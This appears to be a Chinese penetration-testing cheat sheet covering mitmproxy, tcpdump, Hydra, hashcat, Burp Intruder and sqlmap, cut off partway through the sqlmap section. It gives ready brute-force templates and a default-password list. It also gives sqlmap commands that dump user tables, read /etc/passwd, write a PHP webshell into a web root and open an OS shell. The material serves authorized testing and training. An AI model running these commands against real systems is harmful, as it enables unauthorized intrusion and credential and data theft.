## [g-proxy] 代理与流量——抓包、改包、看流量
### [mitmproxy] mitmproxy 命令速查 | easy | mitmproxy;proxy;mitmdump | mitmproxy;中间人
> 命令行代理工具，适合脚本化与自动化场景，与 Burp 互补。

#### 这个条目的作用
mitmproxy 是一个开源的中间人代理，用来拦截、查看、修改 HTTP/HTTPS 流量。它有三种形态：`mitmproxy`（交互式 TUI 界面）、`mitmdump`（纯命令行，可加 Python 脚本）、`mitmweb`（浏览器 Web 界面），其中 `mitmdump` 是自动化挂机的首选。

#### 前置条件
- 已安装 mitmproxy：`pip install mitmproxy` 或 `apt install mitmproxy`
- 目标浏览器/设备能设置代理（能改代理就能抓）
- 抓 HTTPS 需要先信任 mitmproxy 的 CA 证书

#### 第 1 步：启动代理
操作：终端直接运行下面任一命令，先跑通最简单的形态。

```bash
mitmproxy -p 8080     # 交互式界面（上下键翻页，回车看详情）
mitmweb -p 8081       # Web 界面，自动打开 http://127.0.0.1:8081
```

预期结果：`mitmproxy` 会进入全屏列表界面并监听 8080；`mitmweb` 会在浏览器打开流量列表页。没报错就是起来了。

如果不行：提示 `Address already in use` 说明 8080 被占，换端口 `-p 8081`；提示命令找不到说明没装成功，重新 `pip install mitmproxy`。

#### 第 2 步：让浏览器走代理
操作：以 Firefox 为例，`设置 -> 网络设置 -> 手动配置代理 -> HTTP 代理填 127.0.0.1，端口填 8080`，勾选「也用于 HTTPS」。Chrome 可装 SwitchyOmega 扩展或启动时加参数。

```bash
# Chrome 命令行方式临时走代理（临时方案，不影响系统设置）
chrome --proxy-server="http://127.0.0.1:8080"
```

预期结果：在浏览器随便访问一个 http 网站，mitmproxy 界面里开始刷出请求条目。

如果不行：浏览器一直转圈打不开页面，多半是代理没关又连不上 8080，检查 mitmproxy 是否还在运行，或换成 `127.0.0.1` 拼写错误排查。

#### 第 3 步：信任 HTTPS 证书
操作：先用代理访问 `http://mitm.it`，页面会列出各系统的证书下载入口，按你的系统（Windows/Android/iOS）下载 cert，然后安装并信任为根证书。

预期结果：安装后再访问 https 网站，mitmproxy 里能看到可读的明文请求，不再显示证书错误页。

如果不行：访问 `http://mitm.it` 打不开，先确认代理确实生效（访问普通 http 站点有流量）；Android 7+ 对用户证书默认不信任，抓 App 流量需把证书装进系统证书区或改用 `mitmproxy` 的 `--set block_global=false` 等配置，平时测 Web 用浏览器证书即可。

#### 第 4 步：交互界面过滤流量
操作：在 `mitmproxy` 界面底部输入过滤表达式回车，只显示关心的流量。

| 表达式 | 含义 |
|---|---|
| `~u login` | URL 中包含 login |
| `~m POST` | 只看 POST 请求 |
| `~q` / `~s` | 只看请求 / 只看响应 |
| `~d google` | 域名包含 google |
| `~b password` | 请求或响应体包含 password |

预期结果：列表立刻只剩匹配项，按 `q` 退出过滤回到全量列表。

如果不行：输入后没反应，确认不是中文输入法状态；过滤器和 Burp 的 Scope 类似，只影响显示不影响抓包。

#### 第 5 步：mitmdump 保存与回放流量
操作：`mitmdump` 适合无人值守，用 `-w` 把流量存成文件，用 `-r` 回放分析。

```bash
mitmdump -p 8080 -w flows.log     # 抓包并写入文件
mitmdump -r flows.log             # 只读回放，不抓新包
```

预期结果：`-w` 模式下终端滚动显示流量并落盘；`-r` 回放时把文件内容一行行打出来。

如果不行：文件写不进去先确认当前目录可写；回放显示为空，检查 `-w` 时是否真的抓到过包。

#### 第 6 步：用 Python 脚本自动改包
操作：写一个 addon 脚本，在请求经过时用 Python 修改，再用 `-s` 加载。

```python
# addon.py：给每个请求自动加一个 header
def request(flow):
    flow.request.headers["X-Custom"] = "hello"

def response(flow):
    print("URL:", flow.request.url, "->", flow.response.status_code)
```

```bash
mitmdump -p 8080 -s addon.py
```

预期结果：每个请求都带着 `X-Custom: hello` 发出，终端打印每条响应的状态码。

如果不行：报语法错误检查缩进；`ModuleNotFoundError` 说明脚本文件路径写错或文件名带空格。

> [!tip] mitmdump 配 Python 脚本可实现自动改包、自动提取 Token、批量加 header，比 Burp 更适合长时间挂机任务。

#### 常见错误与排查

| 现象 | 原因 | 解决 |
|---|---|---|
| HTTPS 站点显示证书错误 | 未安装并信任 mitmproxy CA 证书 | 代理访问 http://mitm.it 下载证书并安装到系统根证书 |
| 端口被占用启动失败 | 8080 已被其他程序占用 | `-p` 换端口，或 `lsof -i:8080` 查占用进程 |
| 浏览器打不开任何网页 | 代理指向了没启动的 mitmproxy | 先启动 mitmproxy 再开浏览器，或临时关闭代理 |
| 抓不到手机 App 流量 | 设备与电脑不同网段 / 未设代理 | 同一 WiFi 下手动设代理，并完成证书安装 |
| mitmproxy 界面乱码 | 终端编码问题 | 用 UTF-8 终端，或改用 mitmweb 看 Web 界面 |

#### 实战要点
- 日常看包用 mitmweb，自动化挂机用 mitmdump，交互翻包用 mitmproxy，形态别混。
- HTTPS 永远先装证书再谈抓包，证书没装好后面的流量全是密文。
- 过滤表达式用 `~u`/`~m` 组合能快速定位登录、接口类请求。
- 改包脚本里操作 `flow.request.headers` / `flow.response` 即可，不用学习复杂 API。
- 与 Burp 的定位差异：Burp 重放爆破强，mitmproxy 脚本化批处理强，两者互补不冲突。

### [tcpdump] tcpdump 抓包速查 | easy | tcpdump;capture;pcap | 抓包;流量分析
> 服务器端抓包利器，配合 Wireshark 分析 pcap，适合排查反弹 shell 与内网流量。

#### 这个条目的作用
tcpdump 是 Linux 上最常用的命令行抓包工具，直接看网卡上跑的原始报文。平时渗透常拿它做两件事：一是目标机上看有没有不知名的外连（反弹 shell 排查），二是把流量存成 pcap 拖回本地用 Wireshark 慢慢分析。

#### 前置条件
- Linux 系统（Kali 自带），root 权限或 sudo（抓包需要）
- 知道目标网卡名：`ip addr` 或 `ifconfig` 查看，常见 eth0 / ens33 / wlan0

#### 第 1 步：确认网卡并抓全量流量
操作：先看网卡名，再从该网卡抓包（Ctrl+C 停止）。

```bash
ip addr | grep -E '^[0-9]+:'    # 列出所有网卡名
sudo tcpdump -i eth0            # 抓 eth0 全部流量
```

预期结果：终端不断刷新一行行报文摘要（时间戳、源/目的 IP、端口、长度）。刷不出来先确认有流量产生。

如果不行：`No such device` 说明网卡名写错，用 `ip addr` 先查；`Permission denied` 记得加 `sudo`。

#### 第 2 步：按主机、端口、协议过滤
操作：用 `host` / `port` / `tcp` / `udp` 关键字缩小范围。

```bash
sudo tcpdump -i eth0 host 1.2.3.4          # 只看与某 IP 的往来
sudo tcpdump -i eth0 port 80               # 只看 80 端口
sudo tcpdump -i eth0 tcp                   # 只看 TCP
sudo tcpdump -i eth0 udp port 53           # 只看 DNS（UDP 53）
```

预期结果：列表里只剩匹配条件的数据包，其余被过滤掉。

如果不行：写 `port` 时不能和 `tcp` 写反（`tcp port 80` 合法，`port tcp 80` 不合法）；过滤器不生效多是因为没加引号包住组合表达式（见第 3 步）。

#### 第 3 步：组合过滤条件
操作：用 `and`（或 `&&`）、`or`（或 `||`）、括号组合多个条件，整体用单引号包住。

```bash
sudo tcpdump -i eth0 'tcp port 80 or udp port 53'
sudo tcpdump -i eth0 'host 1.2.3.4 and tcp port 4444'
```

预期结果：只显示同时满足（或任一满足）条件的包。括号写法：`tcpdump -i eth0 'host a and (port 80 or port 443)'`。

如果不行：不加引号时 shell 会把 `&`、括号吃掉报语法错误，所有组合过滤一律用单引号包起来。

#### 第 4 步：抓 SYN 包排查外连与扫描
操作：抓所有 TCP 的 SYN 标志位包，看谁在建连。

```bash
sudo tcpdump -i eth0 -n 'tcp[13] & 2 != 0'
```

预期结果：只显示 SYN 包。`tcp[13]` 是 TCP 头标志位字节，`& 2` 表示取 SYN 位。

如果不行：表达式写错会报 `syntax error`，照抄上面这行即可；`-n` 是关闭域名解析（见第 6 步），建议始终加上。

#### 第 5 步：保存 pcap 并读取
操作：抓包直接写文件（不刷屏），之后用 `-r` 回放或拖到 Wireshark 分析。

```bash
sudo tcpdump -i eth0 -w cap.pcap           # 写入文件，Ctrl+C 结束
sudo tcpdump -r cap.pcap                   # 读回文件查看
sudo tcpdump -r cap.pcap -c 5              # 只看前 5 个包
```

预期结果：`-w` 时不打印摘要只静默写盘，结束后 `ls -lh cap.pcap` 能看到文件；`-r` 正常回放。

如果不行：`-w` 写的文件用 `file cap.pcap` 确认是 pcap 格式；用 Wireshark 打开时提示损坏，可能抓包中途被强杀，重新抓即可。

#### 第 6 步：控制输出量
操作：`-c` 抓够即停、`-n` 不做域名解析、`-A`/`-X` 查看载荷内容。

```bash
sudo tcpdump -i eth0 -c 100                # 抓 100 个包自动停止
sudo tcpdump -i eth0 -n                    # 显示 IP 而不是解析域名
sudo tcpdump -i eth0 -A                    # 以 ASCII 显示载荷（看明文 HTTP）
sudo tcpdump -i eth0 -X                    # hex + ASCII 双显示
```

预期结果：`-c 100` 抓满自动退出；`-A` 下能直接读出 HTTP 请求头等明文内容。

如果不行：`-c` 还没到数量就 Ctrl+C 是正常的；想看完整 HTTP 明文建议 `-A` 加过滤 `port 80` 一起用，否则刷屏太快。

> [!tip] 排查反弹 shell 时全量抓包后找陌生外连 IP，或抓 SYN 包 `tcpdump -i eth0 -n 'tcp[13] & 2 != 0'`。

> [!warn] 抓包需 root 权限；生产环境注意 -w 磁盘占用，用 -c 或 timeout 限制时长。

#### 常见错误与排查

| 现象 | 原因 | 解决 |
|---|---|---|
| No such device | 网卡名写错 | 先 `ip addr` 查真实网卡名（eth0/ens33 等） |
| Permission denied | 没权限 | 命令前加 `sudo` |
| syntax error | 过滤表达式被 shell 拆解 | 组合条件整体用单引号包住 |
| 抓包文件巨大撑爆磁盘 | 长时间 `-w` 不做限制 | 加 `-c 数量` 或用 `timeout 300 tcpdump -i eth0 -w x.pcap` |
| 看不到 HTTPS 内容 | 流量加密 | 抓包目标改为看 TLS 握手/连接行为，明文内容交给 mitmproxy 解密 |
| 网卡混杂模式提示 | 某些环境下抓不全 | 确认网卡支持并提示已进入 promiscuous 即可 |

#### 实战要点
- 先想清楚「我要看哪个网卡、哪个端口」，过滤器能省 90% 的刷屏时间。
- 渗透排查反弹 shell：`tcpdump -i any -n 'tcp[13] & 2 != 0'` 盯陌生 IP 的建连。
- 目标机不方便装 Wireshark 时，`-w` 存 pcap 拖回本地分析是标准姿势。
- `-n` 建议常开，域名解析既慢又可能泄露查询痕迹。
- 看明文协议（HTTP/FTP/Telnet）用 `-A`；看二进制结构用 `-X`。

## [g-brute] 爆破与口令——在线爆破、哈希破解、组合策略
### [hydra] Hydra 在线爆破模板 | easy | hydra;brute;ssh;ftp;http | hydra;爆破
> Hydra 支持数十种协议在线爆破，模板化使用即可覆盖 SSH、FTP、Web 登录等场景。

#### 这个条目的作用
Hydra 是经典的在线口令爆破工具：不断用猜的用户名/密码去登录目标服务，直到蒙对。它内置几十种协议支持（SSH、FTP、HTTP、RDP、MySQL 等），是拿到端口后批量试弱口令的主力工具。

#### 前置条件
- Kali 自带 hydra；其他系统 `apt install hydra` 或 `brew install hydra`
- 已通过扫描拿到目标 IP、服务端口、服务类型
- 准备好用户名和密码字典（SecLists 里有现成的）

#### 第 1 步：准备字典文件
操作：每个用户名/密码一行，纯文本保存。

```bash
# users.txt（举例）
admin
root
user

# pass.txt（举例）
admin
123456
password
```

预期结果：`cat users.txt` 能逐行打印内容，文件无 BOM、无空行干扰。

如果不行：Windows 编辑的 txt 换成 `sed -i 's/\r$//' users.txt` 去行尾符，否则会带看不见的 `\r` 导致爆破全失败。

#### 第 2 步：SSH 爆破
操作：用 `-L 用户字典 -P 密码字典`，服务地址写成 `协议://IP` 形式。

```bash
hydra -L users.txt -P pass.txt ssh://192.168.1.10
```

预期结果：逐个尝试并在最后打印 `[ssh] host: 192.168.1.10 login: admin password: 123456` 这类命中行，没命中也会给统计汇总。

如果不行：提示 `Connection refused` 先确认 22 端口真的开放（`nmap -p 22`）；提示版本未知（`unknown service`）说明该服务在目标上协议实现特殊，换 `-s 端口` 指定或放弃该协议。

#### 第 3 步：FTP 爆破（单用户名）
操作：已知用户名时用 `-l`（小写 L）固定用户名，只爆密码。

```bash
hydra -l admin -P pass.txt ftp://192.168.1.10
```

预期结果：只对 admin 这个用户名尝试所有密码，命中输出 `[ftp] host: 192.168.1.10 login: admin password: admin888`。

如果不行：FTP 服务对连续失败有封禁策略，命中不了先看 `-t` 线程数（见第 6 步）并降速重试。

#### 第 4 步：HTTP POST 表单爆破（重点）
操作：Web 登录爆破需要把「表单怎么提交、失败时页面长什么样」告诉 hydra，用 `http-post-form` 协议。

```bash
hydra -l admin -P pass.txt 192.168.1.10 http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
```

语法拆解：三个冒号分隔的段 —— `路径` : `POST 体（^USER^/^PASS^ 是占位符，会被字典内容替换）` : `失败标志`。也可以反过来用 `S=success` 指定成功标志。

预期结果：尝试所有密码，正确的那个请求会得到不含 `incorrect` 的响应，hydra 判定命中。

如果不行：最常见是失败标志找错——先从 Burp 抓一次错误登录的响应，找响应体里稳定的词（如 `incorrect`、`error`、`用户名或密码错误`）填到 F= 后面；表单参数名（本例 user/pass）要以 Burp 抓包为准，写错参数名永远爆不出来。

#### 第 5 步：保存结果与命中即停
操作：加 `-o` 保存结果，加 `-f` 命中第一个即停。

```bash
hydra -L users.txt -P pass.txt -t 16 -f -o ok.txt ssh://192.168.1.10
```

预期结果：进程在命中后停止，`cat ok.txt` 能看到所有命中的账号密码记录。

如果不行：`ok.txt` 没生成是正常（没命中），命中后才有内容；`-f` 只对单目标有效。

#### 第 6 步：常用参数调节
操作：按目标承受能力调并发、显示与超时。

```bash
hydra -L users.txt -P pass.txt -t 8 -V -o ok.txt ssh://192.168.1.10    # -V 显示每次尝试
hydra -l admin -P pass.txt -s 2222 ftp://192.168.1.10                  # -s 指定非默认端口
hydra -l admin -P pass.txt -w 10 ftp://192.168.1.10                    # -w 单次超时 10 秒
```

| 参数 | 作用 |
|---|---|
| -l / -L | 固定用户名 / 用户名字典 |
| -p / -P | 固定密码 / 密码字典 |
| -t | 并发线程数（默认 16） |
| -f | 命中第一个即停止 |
| -o 文件 | 保存结果 |
| -V | 显示每次尝试 |
| -s 端口 | 指定非默认端口 |
| -w 秒 | 连接超时时间 |

预期结果：参数生效后行为符合上述表格描述，例如 `-s 2222` 会去连 2222 端口。

> [!warn] 爆破属高风险操作，务必确认授权；-t 过高会打爆目标或被封 IP，配合代理或限速。

#### 常见错误与排查

| 现象 | 原因 | 解决 |
|---|---|---|
| 爆不出任何结果 | 字典太弱 / 目标有防爆破 | 换大字典（rockyou），降线程 -t 4，配合代理 |
| Connection refused | 端口没开或写错 | 用 nmap 确认端口与协议再爆 |
| http-post-form 语法错误 | 三段冒号拆分不对或失败标志错 | 抓包确认参数名与失败标志词，照 `路径:POST体:F=标志` 模板重写 |
| 密码带 \r 全部失败 | Windows 编辑的字典 | `sed -i 's/\r$//' 字典文件` 去行尾符 |
| IP 被封 | 并发太高触发封禁 | 换 IP 入口或降 -t，加睡眠重试 |
| Hydra 不存在命令 | 未安装 | `apt install hydra`（Kali 默认自带） |

#### 实战要点
- 顺序：nmap 探到服务 -> 定位登录入口 -> Burp 抓包拿参数名 -> 填 hydra 模板。
- FTP/SSH 类直接写 `协议://IP`；Web 登录一律用 `http-post-form` 并确认失败标志。
- 爆破前先试默认口令（admin/admin、root/123456），常比跑字典快。
- 大字典用小线程慢跑，别把目标打挂；授权边界内操作。
- 命中口令后立即验证是否可登录成功，hydra 偶有误报（尤其 F= 标志选词不稳时）。

### [hashcat] Hashcat 模式与字典路径 | medium | hashcat;hash;crack | hashcat;密码破解
> Hashcat 用 GPU 高速破解哈希，选对 hash 模式是关键，字典与掩码配合使用。

#### 这个条目的作用
hashcat 是离线哈希破解工具：把拿到的哈希（MD5、SHA、NTLM、bcrypt 等）放到本机用 GPU/CPU 暴力尝试，尝试出原文密码。它不联网打目标，破解的是你已经拿到手的哈希文件，速度和「模式选得对不对」直接相关。

#### 前置条件
- 一台有 NVIDIA/AMD 显卡或较强 CPU 的机器（Kali 自带 hashcat）
- 一个格式正确的哈希文件（每行一个哈希，`hash:用户名` 这类组合要对应模式）
- 密码字典（`/usr/share/wordlists/rockyou.txt`）或掩码思路

#### 第 1 步：确认哈希类型
操作：先让 hashcat 猜哈希类型，避免模式选错白跑。

```bash
hashcat --identify hash.txt
```

预期结果：输出 `Hash-mode 0 [ MD5 ]` 之类的结果，给出候选模式与算法名。

如果不行：`--identify` 猜错或不确定，人工根据哈希长度判断：32 位十六进制多为 MD5（模式 0）、40 位多为 SHA1（100）、开头 `$6$` 是 sha512crypt（1800）、`$2y$`/`$2b$` 开头是 bcrypt（3200）。

#### 第 2 步：准备字典
操作：Kali 的 rockyou 是压缩包，先解压，再确认可用。

```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
wc -l /usr/share/wordlists/rockyou.txt
```

预期结果：解压后文件存在，行数在 1400 万行左右（`wc -l` 输出 `14344391` 等大数）。

如果不行：确认 `/usr/share/wordlists/` 下真的有 rockyou.txt.gz，没有就先 `apt install wordlists` 或从 SecLists 拿密码字典（`/usr/share/seclists/Passwords/` 下有分类目录）。

#### 第 3 步：字典攻击（-a 0）
操作：`-m` 指定哈希模式，`-a 0` 指定字典攻击，后面依次是哈希文件、字典。

```bash
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

预期结果：界面显示进度（`Recovered : 3/10` 之类）并滚动尝试速率；跑完提示用 `--show` 看结果。

如果不行：`No hashes loaded` 说明哈希文件格式不对，确认每行一个哈希且无多余空格；提示 `Separator unmatched` 说明文件里冒号组合的格式不符合该模式要求。

#### 第 4 步：查看破解结果
操作：`--show` 输出已破解的哈希与明文，`--potfile-path` 看存储文件。

```bash
hashcat -m 0 hash.txt --show
```

预期结果：输出 `5f4dcc3b5aa765d61d8327deb882cf99:password` 这类「哈希:明文」行。

如果不行：`--show` 为空先确认这次会话真的破解成功过（看运行时的 `Recovered` 计数）；破解结果是持久化的，重启后 `--show` 依然能查。

#### 第 5 步：掩码攻击（-a 3）跑短密码
操作：不知道常见密码、想按规则穷举时用掩码。`?l 小写 ?u 大写 ?d 数字 ?s 特殊符号 ?a 全字符`。

```bash
hashcat -m 0 -a 3 hash.txt '?d?d?d?d?d?d'        # 6 位纯数字，如 123456
hashcat -m 0 -a 3 hash.txt '?u?l?l?l?l?l?d?d'    # 常见组合：大写+小写+数字
```

预期结果：按掩码规则生成所有组合（?d 表示 0-9，6 位就是 100 万种）逐一尝试。掩码越长组合数爆炸，先跑短的。

如果不行：掩码里不能混入字面量（如 `?d?d?d` 写全），否则组合数不对；复杂规则（固定前缀如 `admin?d?d?d`）直接写进掩码即可。

#### 第 6 步：组合攻击（-a 1）拼两个字典
操作：`-a 1` 把两个字典逐项拼接（第一个在前）。

```bash
hashcat -m 1000 -a 1 hash.txt d1.txt d2.txt      # 每项 = d1 内容 + d2 内容
```

预期结果：组合数 = 字典1 行数 × 字典2 行数。

如果不行：`-a 1` 必须且只能给两个字典文件，多了少了都会报参数错误。

#### 第 7 步：规则变形（-r）扩展字典
操作：加载规则文件让每个字典词变形（加后缀、大小写、Leet 替换）。

```bash
hashcat -m 0 -a 0 hash.txt dict.txt -r /usr/share/hashcat/rules/best64.rule
```

预期结果：`best64.rule` 会基于每个原词生成 64 种常见变形（如 password -> password1、Password!）。

如果不行：规则文件路径写错会 `File not found`；规则数量大时速度下降明显，属正常现象。

> [!tip] 常见弱口令组合：admin/admin、root/root、admin/123456、admin/admin888、password、厂商默认口令如 admin/Admin@123。

> [!warn] hashcat 需 GPU 或高性能 CPU；先 `hashcat --identify` 确认哈希类型，参数错会直接报错退出。

#### 常见错误与排查

| 现象 | 原因 | 解决 |
|---|---|---|
| No hashes loaded | 哈希文件为空或格式不符模式 | 每行一个哈希，去掉多余字符，用 --identify 核对 |
| Separator unmatched | `哈希:用户名` 格式与模式不匹配 | 换对应模式，或去掉冒号后部分只留哈希 |
| OpenCL 报错/无设备 | 显卡驱动或 OpenCL 未装 | 装显卡驱动，或用 `--force`（CPU 也能跑，慢） |
| --show 为空 | 没破解成功或模式不对 | 换字典/掩码，先确认 --identify 结果 |
| Exhausted 无结果 | 字典/掩码空间已跑完 | 换大字典、加规则 -r、换掩码思路 |
| 破解速度极慢 | GPU 没启用、算法是 bcrypt/argon2 | 核对 -m 模式，慢算法属正常，缩小字典 |

#### 实战要点
- 先 `--identify` 或人工看哈希特征定模式，模式错了什么都白跑。
- 密码库里的 admin/123456 这类先试 `rockyou` 字典，秒出；跑不完再上掩码。
- 掩码从短到长：`?d?d?d?d?d?d`（100 万）→ 7 位 → 8 位，别一上来跑 10 位。
- 慢哈希（1800/3200）别跑大字典，先试常见弱口令字典（sec lists 的 Common-Credentials）。
- 破解结果记在 potfile 里，换命令前先 `--show` 把已破的明文捞出来保存。

### [burp-intruder] Intruder 四种攻击模式 | easy | burp;intruder;fuzz | intruder;爆破模式
> Intruder 的四种模式解决不同爆破场景，选错模式会直接导致结果无效。

#### 这个条目的作用
Burp Intruder 是自动化「重复发请求、换参数」的工具，做登录爆破、参数 fuzz、ID 遍历都靠它。它的核心是四种攻击模式——决定「payload 往哪些位置填、怎么组合」，选错模式轻则慢、重则结果全废。

#### 前置条件
- Burp Suite 已启动，浏览器代理已配置、CA 证书已装
- 已在 Proxy 里抓到目标登录请求（或任何要爆破的请求）
- 准备好 payload 字典（用户名/密码/ID 列表等）

#### 第 1 步：把请求发到 Intruder
操作：在 Proxy 的 HTTP history 里找到目标请求，右键。

```txt
右键请求 -> Send to Intruder（快捷键 Ctrl+I 或 Cmd+I）
```

预期结果：底部切到 `Intruder` 标签页能看到 `Positions` 面板，请求原文带彩色高亮的参数。

如果不行：请求列表里没有目标请求，先确认代理抓包成功、请求确实经过 Burp；右键菜单找不到 Send to Intruder 说明没选中请求行。

#### 第 2 步：标记攻击位置
操作：在 `Positions` 页，把要替换的参数用鼠标选中后点 `Add §` 加上两个 § 符号。

```txt
POST /login.php HTTP/1.1
...
user=§admin§&pass=§123456§
```

预期结果：要爆破的参数被 `§` 包围，`Attack type` 下拉框可用，`Payload positions` 列出所有标记。

如果不行：误标的参数点 `Clear §` 清空重标；`§` 计数必须是偶数成对，否则 Burp 会提示位置无效。

#### 第 3 步：选择攻击模式
操作：在 `Attack type` 下拉框里选。这是 Intruder 的灵魂，按场景选：

| 模式 | 行为 | 适用场景 |
|---|---|---|
| Sniper 狙击手 | 一个位置一个位置地换 payload，同一时刻只动一个 § | 单参数爆破（只爆密码） |
| Battering ram 攻城锤 | 所有 § 位置同时填入同一个 payload 值 | 用户名密码相同的场景（admin/admin） |
| Pitchfork 草叉 | 多组 payload（Payload set 1/2...）按行一一配对，第 N 行组合 | 已有 用户名-密码 配对字典 |
| Cluster bomb 集束炸弹 | 多组 payload 做笛卡尔积全组合 | 用户名 X 密码全组合摸底 |

预期结果：选 Sniper 时下方只有 `Payload set 1`；选 Pitchfork/Cluster bomb 时出现 Payload set 1/2 两个标签页。

如果不行：选了 Pitchfork 却只有一个 payload 集，说明 § 位置不足两个；两个 § 位置必须各自对应一个 payload 集。

#### 第 4 步：配置 payload 字典
操作：分别进 `Payloads` 页，`Payload set` 选 1（或 2），`Payload type` 选 `Simple list`，把字典粘贴进下方列表，或用 `Load` 从文件导入。

```txt
Payload set: 1
Payload type: Simple list
[admin, root, user, ...]      # 用户名字典
Load... -> top-usernames.txt

Payload set: 2
[123456, password, admin888, ...]   # 密码字典
Load... -> top-passwords.txt
```

预期结果：每个 payload 集下方显示加载的条目数量；右上角 `Start attack` 按钮变为可用。

如果不行：`Load` 按钮在 payload 列表上方；文件里是空行会自动跳过；条数显示 0 说明文件读取失败，检查编码与路径。

#### 第 5 步：调 Options（线程与匹配）
操作：进 `Settings`（旧版叫 Options）页：`Resource pool` 调并发（默认 1 线程，爆破调到 10-20），`Grep - Match` 加「用户名或密码错误」这类失败特征词便于区分成功响应。

预期结果：`Resource pool` 有并发设置；`Grep - Match` 列表里加了特征词后，攻击结果表会多一列对勾显示该词是否出现。

如果不行：社区版（Community）限速严重，调高并发也没用，改用词语法或换 ffuf；特征词必须和响应体实际内容一致，从 Burp 里复制。

#### 第 6 步：发起攻击并分析结果
操作：点 `Start attack`，结果表按 `Length`（响应长度）或 `Status` 排序找异常项。

预期结果：弹窗里逐行闪过请求；爆完点列头排序，登录成功的响应通常长度和状态码与失败的明显不同（更长的跳转页 / 200 而非 302）。

如果不行：全部长度一样说明 payload 没生效（§ 位置标错）或特征没变；点开单条记录看 Response 内容手动确认是否真的成功。

> [!tip] 登录爆破优先 Pitchfork 用 seclists 的 top-usernames 加 top-passwords 配对字典，比全组合快得多。

> [!warn] 社区版 Intruder 有速率限制，高并发先确认目标能承受，配合 Throttle 限速。

#### 常见错误与排查

| 现象 | 原因 | 解决 |
|---|---|---|
| 攻击结果全部相同 | § 位置没标对 / payload 没替换进请求 | 回 Positions 核对 §，重发一条看 payload 是否真正替换 |
| 有 Payload set 2 但没生效 | 选了 Sniper 只用第一个集 | 改成 Pitchfork 或 Cluster bomb |
| 登录页跳验证码/封 IP | 触发防爆破 | 降线程加 Throttle，或换思路绕验证码 |
| 社区版速度极慢 | 版本限速 | 小字典精爆，大字典换 ffuf/脚本 |
| Pitchfork 配对错位 | 两个字典行数不等 | 让两组字典行数对齐（补齐或截断） |
| 找不到成功响应 | 成功标志判断错 | 手动看响应内容，用 Grep-Match 特征词定位 |

#### 实战要点
- 单参数爆破用 Sniper；用户密码配对用 Pitchfork；全组合摸底用 Cluster bomb——按场景选，勿混。
- CTF/靶场常见弱口令直接用 Pitchfork + 常见用户/密码短字典，几秒出结果。
- 结果表按 Length 排序是找异常响应的最快方式，登录成功页通常更长。
- Grep-Match 加上「失败特征词」，成功条目一眼可见。
- 先在 Repeater 里手动试一次确认请求可重放、参数名正确，再上 Intruder。

## [g-exp] 漏洞利用框架——注入、漏洞利用与浏览器攻击
### [sqlmap] SQLMap 参数速查 | easy | sqlmap;sql;injection | sqlmap;注入
> SQLMap 是 SQL 注入自动化之王，从检测到脱库到 getshell 一条龙，重点是参数组合。

#### 这个条目的作用
sqlmap 是自动化 SQL 注入工具：给它一个带参数的 URL，它能自动检测注入点，然后一步步把数据库、表、字段、数据全拖出来，甚至在条件允许时读写文件、执行系统命令。日常渗透和 CTF 里「拿注入点 -> 出数据」基本就靠它。

#### 前置条件
- 装有 sqlmap（Kali 自带；其他系统 `pip install sqlmap`）
- 已发现一个带参数的 URL（如 `http://target.com/item.php?id=1`）
- 已确认目标授权（自动化注入流量特征明显）

#### 第 1 步：基础检测
操作：把 URL 用双引号包住传给 `-u`，加 `--batch` 全自动应答。

```bash
sqlmap -u "http://target.com/item.php?id=1" --batch
```

预期结果：先做注入点检测，打印 `Parameter: id (GET)` 和 `is vulnerable` 等结论；接着自动收集库版本、用户等信息。

如果不行：报 `connection timed out` 先确认目标可达；提示后端返回异常，试试把 `--batch` 拆掉手动选择测试级别，或给 `--random-agent` 伪装 UA。

#### 第 2 步：从 Burp 请求文件读取目标
操作：Burp 里右键请求 `Copy to file` 存成 request.txt，用 `-r` 加载（自动带上 Cookie、Header）。

```bash
sqlmap -r request.txt --batch
```

预期结果：sqlmap 解析出完整请求头与 POST 体，提示检测到的可注入参数；比手敲 `-u` 更稳，尤其带登录态时。

如果不行：`request.txt` 必须是 Burp 导出的原始请求格式（含 `POST /xxx HTTP/1.1` 头行）；手工拷贝时会丢格式，用右键导出最稳。

#### 第 3 步：枚举数据库、表、字段、数据
操作：按层级递进：`--dbs` 看库 -> `-D 库名 --tables` 看表 -> `-T 表名 --columns` 看字段 -> `-C 字段 --dump` 导出数据。

```bash
sqlmap -u "http://target.com/item.php?id=1" --dbs --batch
sqlmap -u "http://target.com/item.php?id=1" -D ctfdb --tables --batch
sqlmap -u "http://target.com/item.php?id=1" -D ctfdb -T users --columns --batch
sqlmap -u "http://target.com/item.php?id=1" -D ctfdb -T users -C username,password --dump --batch
```

预期结果：`--dbs` 列出数据库名；`-D ... --tables` 列出表名；`--dump` 把整表数据以表格形式打印并保存到本地 CSV。

如果不行：提示 `no parameter(s) found for testing` 说明注入点在这级参数上没测出来，加 `--level 3`（见第 7 步）；`--dump` 卡在破解密码哈希属正常（弱口令可配合 hashcat 条目）。

#### 第 4 步：查当前库、用户、权限
操作：确认当前数据库是什么、数据库账号是谁、有没有 DBA 权限——决定后续能玩多大。

```bash
sqlmap -u "http://target.com/item.php?id=1" --current-db --current-user --is-dba --batch
```

预期结果：输出 `current database: 'ctfdb'`、`current user: 'root@localhost'`、`current user is DBA: True` 等行。

如果不行：`is-dba` 结果为空说明权限探测被限，没关系，继续按注入点拖数据即可；重点关注 DBA 是否为 True，决定文件/命令操作可行性。

#### 第 5 步：文件读与写
操作：DBA + FILE 权限下可以读服务器文件、写 webshell。

```bash
sqlmap -u "http://target.com/item.php?id=1" --file-read=/etc/passwd --batch
sqlmap -u "http://target.com/item.php?id=1" --file-write=/tmp/shell.php \
  --file-dest=/var/www/html/shell.php --batch
```

预期结果：`--file-read` 把文件内容打印出来；`--file-write` 报 `the local file has been successfully written`。

如果不行：`--file-read` 报错先确认 `--is-dba` 和数据库 `secure_file_priv`（MySQL 为 NULL 时不能写）；写文件目录要对（用前面枚举或目录扫描确认 web 根目录），写不进去换个可写目录。

#### 第 6 步：命令执行
操作：权限够（DBA + FILE + 能出网）时用 `--os-shell` 交互式执行系统命令。

```bash
sqlmap -u "http://target.com/item.php?id=1" --os-shell --batch
# 进入后直接输命令
```

预期结果：提示选择脚本语言（php/perl/asp）后进入 `os-shell>` 提示符，输入 `id`、`whoami` 等直接回显。

如果不行：`--os-shell` 失败优先查两个前提：`--is-dba` 是否为 True、`secure_file_priv` 是否放行；两者其一受限就退回 `--file-write` 手动传 shell。

#### 第 7 步：进阶参数组合
